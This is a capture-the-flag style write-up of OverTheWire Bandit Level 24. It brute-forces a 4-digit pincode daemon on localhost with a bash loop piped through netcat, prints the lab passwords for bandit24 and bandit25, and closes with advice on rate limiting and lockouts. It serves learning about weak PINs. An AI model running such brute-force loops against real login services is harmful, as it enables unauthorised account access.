# OverTheWire Bandit — Level 24

**Platform:** OverTheWire Bandit (free SSH wargame — no account, no payment)
**Lab type:** Linux fundamentals / brute-force (pincode daemon)
**Difficulty:** Beginner
**Solved:** 26 November 2026
**Connection:** `ssh bandit24@bandit.labs.overthewire.org -p 2220` (password from Level 23)

## Objective

Retrieve the password for bandit25 from a daemon on localhost port 30002: it wants the password for bandit24 plus a secret 4-digit pincode, and the only way to find the pincode is to try all 10,000 combinations.

## Solution

1. Log in as `bandit24` (password from Level 23).
2. Probe the daemon with a wrong pincode to learn its replies:
   ```
   echo hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0000 | nc localhost 30002
   ```
   Output:
   ```
   I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
   Wrong! Please enter the correct current password and pincode. Try again.
   ```
   The level page adds: "You do not need to create new connections each time" — the daemon accepts many attempts over **one** connection.
3. Brute-force all 10,000 pincodes over a single connection and keep only the non-`Wrong!` reply:
   ```
   { for i in $(seq -w 0 9999); do echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $i"; done; sleep 3; } | timeout 55 nc localhost 30002 | grep -v Wrong
   ```
   Output:
   ```
   I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
   Correct!
   The password of user bandit25 is SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
   ```
   (The correct pincode was `1141` — confirmed later by the `.pin` file in bandit25's home. The whole run took ~7 seconds.)

## Result

Password for bandit25: `SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P` — verified by logging in as bandit25 (`whoami` → `bandit25`).

## Practical Explanation

- **A 4-digit pincode has only 10,000 possibilities** — trivial to brute-force when there is no rate limiting. `seq -w 0 9999` generates `0000`–`9999` zero-padded; piping all attempts through one `nc` connection avoids the overhead of 10,000 separate connections.
- **Filter the noise:** `grep -v Wrong` drops the 9,999 wrong answers, leaving only the banner and the `Correct!` line with the password.
- Real systems stop this with rate limiting, lockouts, and longer secrets — a 4-digit PIN is only acceptable with strict attempt limits.

## Lessons Learned

- Read the daemon's own hint: one connection for all attempts is far faster than reconnecting each time.
- Brute-force is a numbers game: 10,000 tries is nothing; the defence must be rate limiting, not hoping the attacker won't try.

## Mitigation

- Rate-limit authentication attempts and lock accounts after a few failures; use long, random secrets instead of 4-digit PINs.
- Never return a "Wrong!" oracle that lets an attacker test guesses offline — add delays and CAPTCHAs after failures.
